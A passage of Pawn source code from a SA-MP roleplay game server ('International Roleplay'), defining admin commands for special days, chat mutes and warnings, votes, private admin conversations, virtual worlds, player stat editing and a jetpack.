	                SendClientMessage(playerid, 0xFF0000FF, "** [BAD DAYS]: {FFFFFF}3) Sunday | 4) Day Of Restricted Air Space");
	                SendClientMessage(playerid, 0xFF00FFFF, "** [NETURAL DAYS]: {FFFFFF}5) Normal Day");
	                return 1;
	            }
             	if(dayz < 0 || dayz > 6) return SendClientMessage(playerid, COLOR_GRAD2, "Special days are between 1 and 6.");
             	switch(dayz)
            	{
             		case 1:
            		{
            			if(DayRespect == 1 || DayNoShops == 1 || DayZeroGravity == 1 || DayUnbreakable == 1) return SendClientMessage(playerid, COLOR_GRAD2, "There's a special day already.");
            			DayPaycheck = 1;
             			format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
	            		SendClientMessageToAll(COLOR_VIP, string);
	               		SetTimer("DayOver", 7200000, false);
	            		SendRconCommand("hostname International Roleplay [Day Of World Wide Economics]");
	            		format(days, sizeof(days), "%s", SpecialDay());
                    	TextDrawSetString(SPDNDDraw, days);
	               	}
              		case 2:
	             	{
                        if(DayPaycheck == 1 || DayNoShops == 1 || DayZeroGravity == 1 || DayUnbreakable == 1) return SendClientMessage(playerid, COLOR_GRAD2, "There's a special day already.");
            		    DayRespect = 1;
               		    format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
            			SendClientMessageToAll(COLOR_VIP, string);
          		    	SetTimer("DayOver", 7200000, false);
               			SendRconCommand("hostname International Roleplay [Day Of Liberty]");
               			format(days, sizeof(days), "%s", SpecialDay());
                        TextDrawSetString(SPDNDDraw, days);
            		}
            		case 3:
            		{
                        if(DayRespect == 1 || DayPaycheck == 1 || DayZeroGravity == 1 || DayUnbreakable == 1) return SendClientMessage(playerid, COLOR_GRAD2, "There's a special day already.");
            		    DayNoShops = 1;
              		    format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
               			SendClientMessageToAll(COLOR_VIP, string);
            			SetTimer("DayOver", 3600000, false);
             			SendRconCommand("hostname International Roleplay [Sunday]");
             			format(days, sizeof(days), "%s", SpecialDay());
                     TextDrawSetString(SPDNDDraw, days);
             		}
             		case 4:
            		{
                        if(DayRespect == 1 || DayPaycheck == 1 || DayNoShops == 1 || DayUnbreakable == 1) return SendClientMessage(playerid, COLOR_GRAD2, "There's a special day already.");
            		    DayZeroGravity = 1;
              		    format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
               			SendClientMessageToAll(COLOR_VIP, string);
            			SetTimer("DayOver", 3600000, false);
             			SendRconCommand("hostname International Roleplay [Day Of Restricted Air Space]");
             			format(days, sizeof(days), "%s", SpecialDay());
                     TextDrawSetString(SPDNDDraw, days);
					}
					case 5:
					{
    					if(DayPaycheck == 1)
    					{
 								DayPaycheck = 0;
              		    		format(string, sizeof(string), "MOLE has just ended the special day.");
               					SendClientMessageToAll(COLOR_VIP, string);
             					SendRconCommand("hostname International Roleplay");
             					format(days, sizeof(days), "%s", SpecialDay());
                                TextDrawSetString(SPDNDDraw, days);
    					}
						else if(DayRespect == 1)
    					{
 								DayRespect = 0;
              		    		format(string, sizeof(string), "MOLE has just ended the special day.");
               					SendClientMessageToAll(COLOR_VIP, string);
             					SendRconCommand("hostname International Roleplay");
                                format(days, sizeof(days), "%s", SpecialDay());
                                TextDrawSetString(SPDNDDraw, days);
    					}
    					else if(DayNoShops == 1)
    					{
 								DayNoShops = 0;
              		    		format(string, sizeof(string), "MOLE has just ended the special day.");
               					SendClientMessageToAll(COLOR_VIP, string);
		                        SendRconCommand("hostname International Roleplay");
                                format(days, sizeof(days), "%s", SpecialDay());
                                TextDrawSetString(SPDNDDraw, days);
    					}
    					else if(DayZeroGravity == 1)
    					{
            		    		DayZeroGravity = 0;
              		    		format(string, sizeof(string), "MOLE has just ended the special day.");
               					SendClientMessageToAll(COLOR_VIP, string);
             					SendRconCommand("hostname International Roleplay");
                                format(days, sizeof(days), "%s", SpecialDay());
                                TextDrawSetString(SPDNDDraw, days);
						}
						else if(DayUnbreakable == 1)
    					{
            		    		DayUnbreakable = 0;
              		    		format(string, sizeof(string), "MOLE has just ended the special day.");
               					SendClientMessageToAll(COLOR_VIP, string);
             					SendRconCommand("hostname International Roleplay");
                                format(days, sizeof(days), "%s", SpecialDay());
                               TextDrawSetString(SPDNDDraw, days);
						}
						SetTimer("DayOver", 0, false);
					}
					case 6:
            		{
                        if(DayRespect == 1 || DayPaycheck == 1 || DayNoShops == 1 || DayZeroGravity == 1) return SendClientMessage(playerid, COLOR_GRAD2, "There's a special day already.");
            		    DayUnbreakable = 1;
              		    format(string, sizeof(string), "MOLE has just created a special day. ((/day))");
               			SendClientMessageToAll(COLOR_VIP, string);
            			SetTimer("DayOver", 3600000, false);
             			SendRconCommand("hostname International Roleplay [Day Of Unstoppable]");
             			format(days, sizeof(days), "%s", SpecialDay());
                        TextDrawSetString(SPDNDDraw, days);
					}
             	}
          	}
		}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:runmute(playerid, var[])
{
	new string[256], user;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pHelper] >= 2 || Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /runmute [playerid]");
      	if(!Logged(user)) return NoLoginB(playerid);
    	if(Player[user][pRMute] == 1)
    	{
            format(string, sizeof(string), "AdminWarning: %s has unmuted %s from reporting.", GetName(playerid), GetName(user));
            SendAdminMessage(COLOR_ADMWARN, string);
            SendHelperMessage(COLOR_ADMWARN, string);
    	    Player[user][pRMute] = 0;
    	    Player[user][pRWarns] = 0;
    		format(string, sizeof(string), " %s has unmuted you from report.", GetName(playerid));
    		SendClientMessage(user, COLOR_WHITE, string);
    	}
        else if(Player[user][pRMute] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not muted from submitting report.");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:nunmute(playerid, var[])
{
	new string[256], user;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pHelper] >= 2 || Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /nunmute [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
       	if(Player[user][pNMute] == 1)
    	{
            format(string, sizeof(string), "AdminWarning: %s has unmuted %s from newbie channel.", GetName(playerid), GetName(user));
            SendAdminMessage(COLOR_ADMWARN, string);
            SendHelperMessage(COLOR_ADMWARN, string);
    	    Player[user][pNMute] = 0;
	        Player[user][pNWarns] = 0;
    		format(string, sizeof(string), " %s has unmuted you from newbie channel.", GetName(playerid));
    		SendClientMessage(user, COLOR_WHITE, string);
    	}
        else if(Player[user][pNMute] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not muted from newbie channel.");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:nwarn(playerid, var[])
{
	new string[256], user;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pHelper] >= 2 || Player[playerid][pStaffObserver])
   	{
    	if(sscanf(var, "us[64]", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /nwarn [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	Player[user][pNWarns] ++;
       	format(string, sizeof(string), " Helper %s has given you a newbie warning, reason: Abusing Newbie Chat", GetName(playerid));
    	SendClientMessage(user, COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "HelperWarning: %s has given %s a newbie warning, reason: Abusing Newbie Chat", GetName(playerid), GetName(user));
    	SendHelperMessage(COLOR_ADMWARN, string);
    	Log("Log/Admins/nwarn.log", string);
    	if(Player[user][pNWarns] == 3)
    	{
    		format(string, sizeof(string), "You have been muted from newbie chat due to recieving 3 warns.");
    		SendClientMessage(user, COLOR_LIGHTRED, string);
    		format(string, sizeof(string), "%s has been muted from newbie chat due to recieving 3 warns.", GetName(user));
            SendHelperMessage(COLOR_ADMWARN, string);
    		format(string, sizeof(string), "AdmCmd: %s has been muted from newbie chat for reciving 3 warns", GetName(user));
    		Log("Log/Admins/nmute.log", string);
    		Player[user][pNMute] = 1;
    	}
        else if(Player[user][pNMute]) return SendClientMessage(playerid, COLOR_GRAD2, "The player is already muted from newbie.");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:rwarn(playerid, var[])
{
	new string[256], user;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pStaffObserver] || Player[playerid][pAdmin] >= 2)
   	{
    	if(sscanf(var, "us[64]", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /rwarn [playerid]");
      	if(!Logged(user)) return NoLoginB(playerid);
    	Player[user][pRWarns] ++;
    	format(string, sizeof(string), " Administrator %s has given you a warning, reason: Abusing Report", GetName(playerid));
    	SendClientMessage(user, COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "AdminWarning: %s has given %s a warning, reason: Abusing Report", GetName(playerid), GetName(user));
        SendAdminMessage(COLOR_ADMWARN, string);
    	Log("Log/Admins/rwarn.log", string);
    	if(Player[user][pRWarns] == 3)
	    {
    		format(string, sizeof(string), "You have been muted from Report due to recieving 3 report warns.");
    		SendClientMessage(user, COLOR_LIGHTRED, string);
     		format(string, sizeof(string), "%s have been muted from Report due to recieving 3 report warns.", GetName(user));
            SendAdminMessage(COLOR_ADMWARN, string);
    		format(string, sizeof(string), "AdmCmd: %s has been muted from Report for reciving 3 report warns", GetName(user));
    		Log("Log/Admins/rmute.log", string);
    		Player[user][pRMute] = 1;
        }
        else if(Player[user][pRMute]) return SendClientMessage(playerid, COLOR_GRAD2, "The player already muted from report.");
    }
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:startvote(playerid, var[])
{
    new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] < 1338) return NoAuth(playerid);
	if(VoteStarted == 1) return SendClientMessage(playerid, COLOR_GRAD2, "There is already a started vote.");
   	if(sscanf(var, "s[128]", VoteQuestion)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /startvote [question]");
   	VoteStarted = 1;
   	format(string, sizeof(string), "** %s %s has just started a vote.", RPALN(playerid), GetName(playerid));
   	SendClientMessageToAll(COLOR_LIGHTRED, string);
   	format(string, sizeof(string), "** Question: {FFFFFF}%s", VoteQuestion);
   	SendClientMessageToAll(COLOR_LIGHTRED, string);
   	SendClientMessageToAll(COLOR_LIGHTRED, "** You have 30 seconds to vote YES(Press the Y key) or NO(Press the N key).");
   	SetTimer("VoteTimer", 30000, false);
	return 1;
}
IRP:starttalk(playerid, var[])
{
	new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /starttalk [playerid]");
    	if(Chat[playerid] != -1) return SendClientMessage(playerid, COLOR_GRAD2, "You are already chatting with someone.");
    	if(Chat[user] != -1) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already chatting with someone.");
    	Chat[playerid] = user;
    	Chat[user] = playerid;
    	format(string, sizeof(string), "* %s %s has started a {01A9DB}conversation {FF6347}with you, /talk to talk to him.", RPALN(playerid), GetName(playerid));
    	SendClientMessage(user, COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "* You have started a {01A9DB}conversation {FF6347}with %s, /talk to talk to him.", GetName(user));
    	SendClientMessage(playerid, COLOR_LIGHTRED, string);
    	return 1;
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:endtalk(playerid, var[])
{
	new string[256];
 	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 3)
	{
    	if(Chat[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not talking with someone.");
    	new user = Chat[playerid];
    	Chat[playerid] = -1;
    	Chat[user] = -1;
    	format(string, sizeof(string), "* %s %s has ended the {01A9DB}conversation {FF6347}with you.", RPALN(playerid), GetName(playerid));
    	SendClientMessage(user, COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "* You have ended the {01A9DB}conversation {FF6347}with %s.", GetName(user));
    	SendClientMessage(playerid, COLOR_LIGHTRED, string);
    	return 1;
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
/*IRP:aname(playerid, var[])
{
	new string[128], file[32], text[MAX_PLAYER_NAME];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 2) return NoAuth(playerid);
	if(sscanf(var, "s[24]", text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /aname [name]");
	if(aDuty[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You must be off duty to change your admin name.");
	// Start of detecting space in name
	new end, temp[32], temp2[32];
	end = strfind(text, " ",true);
	if(end != -1)
	{
	    strmid(temp, text, 0, end);
	    format(temp, sizeof(temp), "%s_", temp);
	    strdel(text, 0, end);
		strmid(temp2, text, 1, strlen(text));
	    format(text, 24, "");
	    strcat(text, temp, sizeof(temp));
	    strcat(text, temp2, sizeof(temp2));
	}
	// End of detecting space in name
	format(file, sizeof(file), "Accounts/%s.ini", text);
	if(dini_Exists(file))
	{
	    format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	    if(strlen(dini_Get(file, "AdminName")) && strcmp(dini_Get(file, "AdminName"), text))
	    {
	     	SendClientMessage(playerid, COLOR_GRAD2, "That name is already used.");
	        return 1;
	    }
	}
	format(string, sizeof(string), " You have changed your admin name to: {FF0000}%s{FFFF00}.", text);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	format(string, sizeof(string), "%s has changed their admin name to %s.", GetName(playerid), text);
	Log("Log/Admins/adminname.log", string);
	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	format(file, sizeof(file), "Accounts/%s.ini", dini_Get(file, "AdminName"));
	if(dini_Exists(file)) dini_Remove(file);
	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	dini_Set(file, "AdminName", text);
	format(file, sizeof(file), "Accounts/%s.ini",dini_Get(file, "AdminName"));
	dini_Create(file);
	dini_Set(file, "OldName", GetAccountName(playerid));
	dini_IntSet(file, "Admin", Player[playerid][pAdmin]);
	dini_IntSet(file, "AdminAccount", 1);
	dini_IntSet(file, "Age", 25);
	dini_IntSet(file, "Gender", 1);
	dini_IntSet(file, "Tutorial", 1);
	dini_Set(file, "IP", Player[playerid][pIP]);
	return 1;
}
IRP:forceduty(playerid, var[])
{
	new string[128], user;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1338)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /forceduty [adminid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(!Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not an admin.");
    	fduty(user, var);
    	format(string, sizeof(string), "AdminWarning: %s has forced %s to change their admin duty status.", GetName(playerid), GetName(user));
        SendAdminMessage(COLOR_ADMWARN, string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:aduty(playerid, var[])
{
	new string[128], file[32];
   	if(!Logged(playerid)) NoLogin(playerid);
	if(Player[playerid][pAdmin] < 2) return NoAuth(playerid);
	if(!aDuty[playerid])
	{
		format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
		format(file, sizeof(file), "Accounts/%s.ini", dini_Get(file, "AdminName"));
    	if(!dini_Exists(file)) return SendClientMessage(playerid, COLOR_GRAD2, "Choose an admin name using /aname first.");
    	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
        format(string, sizeof(string), "AdminWarning: %s has went on admin duty. (Admin name: %s)", GetName(playerid), dini_Get(file, "AdminName"));
		SendAdminMessage(COLOR_ADMWARN, string);
		SaveChar(playerid);
 	    ClearCar(playerid);
		ClearChar(playerid);
		format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
		SetPlayerName(playerid, dini_Get(file, "AdminName"));
		LoadChar(playerid);
		aDuty[playerid] = 1;
		SpawnChar(playerid);
	    GetPlayerIp(playerid, Player[playerid][pIP], 16);
	}
	else
	{
	    if(Spec[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't go off admin duty while spectating someone.");
	    format(file, sizeof(file), "Accounts/%s.ini",GetAccountName(playerid));
		SaveChar(playerid);
 	    ClearCar(playerid);
	    ClearChar(playerid);
	    SetPlayerName(playerid, dini_Get(file, "OldName"));
		LoadChar(playerid);
		aDuty[playerid] = 0;
		SpawnChar(playerid);
	    format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	    format(string, sizeof(string), "AdminWarning: %s has went off admin duty. (Admin name: %s)", GetName(playerid), dini_Get(file, "AdminName"));
	    SendAdminMessage(COLOR_ADMWARN, string);
	}
	return 1;
}*/
IRP:talk(playerid, var[])
{
	new string[256];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(Chat[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not talking with anybody.");
	if(sscanf(var, "s[256]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /talk [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(Player[playerid][pAdmin]) format(string, sizeof(string), "* %s %s: {01A9DB}%s", RPALN(playerid), GetName(playerid), var);
	else format(string, sizeof(string), "* Player %s: {01A9DB}%s", GetName(playerid), var);
	SendClientMessage(playerid, COLOR_LIGHTRED, string);
	SendClientMessage(Chat[playerid], COLOR_LIGHTRED, string);
	return 1;
}
IRP:ejecthousearrest(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1)
	{
 		new user, string[128];
		if(sscanf(var, "us[128]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /ejecthousearrest [playerid] [reason]");
    	if(!IsPlayerConnected(user)) return NoLoginB(playerid);
    	if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
        format(string, sizeof(string), "AdmCmd: %s has been released from house arrest by %s, reason: %s", GetName(user), GetName(playerid), var);
    	SendClientMessageToAll(COLOR_LIGHTRED, string);
    	format(string, sizeof(string), "AdmCmd: %s has been released from house arrest by %s (%s), reason: %s", GetName(user), GetName(playerid), RPIP(playerid), var);
    	SetPlayerInterior(user, 0);
    	SetPlayerPos(user, 922.0911,-1352.8613,13.2010);
    	SetPlayerFacingAngle(user, 277.0876);
		SendClientMessage(user, COLOR_INT, "You have been released from house arrest by an admin");
		return 1;
	}
	return 1;
}
IRP:setvw(playerid, var[])
{
	new user, vw, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	if(sscanf(var, "ui", user, vw)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setvw [playerid] [VW]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	SetPlayerVirtualWorld(user, vw);
    	format(string, sizeof(string), "* You have set %s's VW %d.", GetName(user), vw);
    	SendClientMessage(playerid, COLOR_WHITE, string);
    	format(string, sizeof(string), "* %s has set your VW %d.", GetName(playerid), vw);
    	SendClientMessage(user, COLOR_WHITE, string);
    	return 1;
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:fixvw(playerid, var[])
{
	new string[128];
	new interior = GetPlayerInterior(playerid);
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Event[playerid] || Paintball[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't fix your virtual world while in Event or Paintball.");
   	if(interior > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't fix your virtual world while in interior.");
   	SetPlayerVirtualWorld(playerid, 0);
   	format(string, sizeof(string), "* You have fixed your virtual world.");
   	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}
IRP:setstats(playerid, var[])
{
	new string[128], user, stat, amount;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "uii", user, stat, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /setstats [playerid] [statid] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [STATS]: 1) Age | 2) Level | 3) Gender | 4) Bank | 5) Phone | 6) Mechanic | 7) Lawyer | 8) Weapons Dealer");
		SendClientMessage(playerid, COLOR_GRAD2, "** [STATS]: 9) Weapons Smuggler | 10) Drugs Dealer | 11) Drugs Smuggler | 12) Weed | 13) Cocaine");
		SendClientMessage(playerid, COLOR_GRAD2, "** [STATS]: 14) Low Materials | 15) Medium Materials | 16) High Materials | 17) Faction | 18) Faction Rank");
		SendClientMessage(playerid, COLOR_GRAD2, "** [STATS]: 19) Seeds | 20) Famed Points | 21) Upgrade Points | 22) VIP Points");
		return 1;
	}
	if(!Logged(user)) return NoLoginB(playerid);
	switch(stat)
	{
	    case 1:
	    {
	        Player[user][pAge] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Age to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 2:
	    {
	        Player[user][pLevel] = amount;
	        SetPlayerScore(user, amount);
			format(string, sizeof(string), "AdminWarning: %s has set %s's Level to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 3:
	    {
			if(amount < 1 || amount > 2) return SendClientMessage(playerid, COLOR_GRAD2, "Gender is between 1 and 2.");
	        if(amount == 1) format(string, sizeof(string), "Male");
	        else if(amount == 2) format(string, sizeof(string), "Female");
	        Player[user][pGender] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Gender to %s.", GetName(playerid), GetName(user), string);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 4:
	    {
	        Player[user][pBank] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Bank Balance to $%d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 5:
	    {
			if(amount != 0)
			{
	        	new idx = 1, File:file = fopen("cellphones.cfg", io_read);
				while(fread(file, string))
				{
				    if(strval(string) == amount) return SendClientMessage(playerid, COLOR_GRAD2, "This number is already registered.");
				    if(strval(string) == Player[user][pPhone])
				    {
						fdeleteline("cellphones.cfg", idx);
				    }
				    idx ++;
				}
				fclose(file);
				file = fopen("cellphones.cfg", io_append);
				format(string, sizeof(string), "%d\r\n", amount);
				fwrite(file, string);
				fclose(file);
			}
	        Player[user][pPhone] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Cellphone Number to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 6:
	    {
	        if(amount < 1 || amount > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Skill level is between 1 and 5.");
	        new skill;
	        if(amount == 1) skill = 0;
	        else if(amount == 2) skill = 100;
	        else if(amount == 3) skill = 300;
	        else if(amount == 4) skill = 700;
	        else if(amount == 5) skill = 1200;
	        Player[user][pJobSkill][JOB_MECHANIC] = skill;
	        format(string, sizeof(string), "AdminWarning: %s has set %s's Mechanic level to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 7:
	    {
	        if(amount < 1 || amount > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Skill level is between 1 and 5.");
	        new skill;
	        if(amount == 1) skill = 0;
	        else if(amount == 2) skill = 100;
	        else if(amount == 3) skill = 300;
	        else if(amount == 4) skill = 700;
	        else if(amount == 5) skill = 1200;
	        Player[user][pJobSkill][JOB_LAWYER] = skill;
	        format(string, sizeof(string), "AdminWarning: %s has set %s's Lawyer level to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 8:
	    {
	        if(amount < 1 || amount > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Skill level is between 1 and 5.");
	        new skill;
	        if(amount == 1) skill = 0;
	        else if(amount == 2) skill = 100;
	        else if(amount == 3) skill = 300;
	        else if(amount == 4) skill = 700;
	        else if(amount == 5) skill = 1200;
	        Player[user][pJobSkill][JOB_WDEALER] = skill;
	        format(string, sizeof(string), "AdminWarning: %s has set %s's Weapons Dealer level to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 9:
	    {
	        if(amount < 1 || amount > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Skill level is between 1 and 5.");
	        new skill;
	        if(amount == 1) skill = 0;
	        else if(amount == 2) skill = 100;
	        else if(amount == 3) skill = 300;
	        else if(amount == 4) skill = 700;
	        else if(amount == 5) skill = 1200;
	        Player[user][pJobSkill][JOB_WSMUGGLER] = skill;
	        format(string, sizeof(string), "AdminWarning: %s has set %s's Weapons Smuggler level to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 10:
	    {
	        if(amount < 1 || amount > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Skill level is between 1 and 5.");
	        new skill;
	        if(amount == 1) skill = 0;
	        else if(amount == 2) skill = 100;
	        else if(amount == 3) skill = 300;
	        else if(amount == 4) skill = 700;
	        else if(amount == 5) skill = 1200;
	        Player[user][pJobSkill][JOB_DDEALER] = skill;
	        format(string, sizeof(string), "AdminWarning: %s has set %s's Drugs Dealer level to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 11:
	    {
	        if(amount < 1 || amount > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Skill level is between 1 and 5.");
	        new skill;
	        if(amount == 1) skill = 0;
	        else if(amount == 2) skill = 100;
	        else if(amount == 3) skill = 300;
	        else if(amount == 4) skill = 700;
	        else if(amount == 5) skill = 1200;
	        Player[user][pJobSkill][JOB_DSMUGGLER] = skill;
	        format(string, sizeof(string), "AdminWarning: %s has set %s's Drugs Smuggler level to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 12:
	    {
	        Player[user][pWeed] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Weed to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 13:
	    {
	        Player[user][pCocaine] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Cocaine to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 14:
	    {
	        Player[user][pLMaterials] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Low Materials to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 15:
	    {
	        Player[user][pMMaterials] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Medium Materials to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
 	    case 16:
	    {
	        Player[user][pHMaterials] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's High Materials to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
	    }
	    case 17:
	    {
	    	Player[user][pFac] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's faction to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
		}
		case 18:
		{
			Player[user][pFacRank] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's faction rank to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
		}
		case 19:
		{
	        Player[user][pSeeds] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Seeds to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
		}
		case 20:
		{
	        Player[user][pFamedPoints] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Famed Points to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
		}
		case 21:
		{
	        Player[user][pUpgradePoints] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's Upgrade Points to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
		}
		case 22:
		{
	        Player[user][pVIPPoints] = amount;
			format(string, sizeof(string), "AdminWarning: %s has set %s's VIP Points to %d.", GetName(playerid), GetName(user), amount);
			SendAdminMessage(COLOR_ADMWARN, string);
		}
	}
	if(amount > 0 && amount < 12) Log("Log/Admins/setstats.log", string);
	return 1;
}

IRP:admins(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 1)
   	{
    	format(string, sizeof(string), "|________ Online Adminstrators Team  ________|");
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		foreach(Player, i)
		{
		    if(Player[i][pAdmin])
		    {
				format(string, sizeof(string), "* %s {FFFFFF}%s", RPALN(i), GetName(i));
		        SendClientMessage(playerid, COLOR_ADMCHAT, string);
		    }
		}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:jetpack(playerid, var[])
{
   if(!Logged(playerid)) return NoLogin(playerid);
   if(Player[playerid][pAdmin] >= 2)
   {
  	  SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	  SendClientMessage(playerid, COLOR_LIGHTRED, "You have spawned a jetpack");
   }
   else
   {
